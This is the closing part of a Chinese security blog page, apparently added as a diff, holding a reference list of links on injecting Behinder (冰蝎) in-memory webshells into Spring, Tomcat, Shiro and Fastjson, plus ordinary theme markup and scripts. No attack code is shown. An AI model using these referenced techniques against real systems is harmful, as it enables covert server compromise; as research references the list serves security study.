+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/bitterz/p/14820898.html">针对spring mvc的controller内存马-学习和实验(注入菜刀和冰蝎可用的马) </a></p>
+<p><a href="https://forum.butian.net/share/398">冰蝎内存webshell注入和防检测分析</a></p>
+<p><a href="https://xz.aliyun.com/t/10696">利用shiro反序列化注入冰蝎内存马</a></p>
+<p><a href="https://xz.aliyun.com/t/9050#toc-15">Java安全02-从ClassLoader到冰蝎Java篇</a></p>
+<p><a href="https://www.incert.cn/posts/2def522d.html">记一次修改版冰蝎简单逆向</a></p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzU2NTc2MjAyNg==&mid=2247484318&idx=1&sn=ece9e52218be0ea84ef166c3bfd20f23&chksm=fcb7811bcbc0080dd2c39f228dcfe069880218b9f354b1283606af680b1eaecdc07a8a43b188&mpshare=1&scene=23&srcid=0531NRPXCZGASzRP4K09dkwb&sharer_sharetime=1642748690856&sharer_shareid=f045ea83ab618e2dffd974c4e052cd1b#rd">冰蝎改造之不改动客户端=&gt;内存马</a></p>
+<p><a href="https://xz.aliyun.com/t/2744">利用动态二进制加密实现新型一句话木马之Java篇</a></p>
+<p><a href="https://paper.seebug.org/1441/#tomcat">中间件内存马注入&amp;冰蝎连接</a></p>
+<p><a href="https://xz.aliyun.com/t/10467#toc-10">利用Fastjson注入Spring内存马</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/17/CVE-2021-40539%E5%88%86%E6%9E%90/">
+                        <span class="hidden-mobile">CVE-2021-40539分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
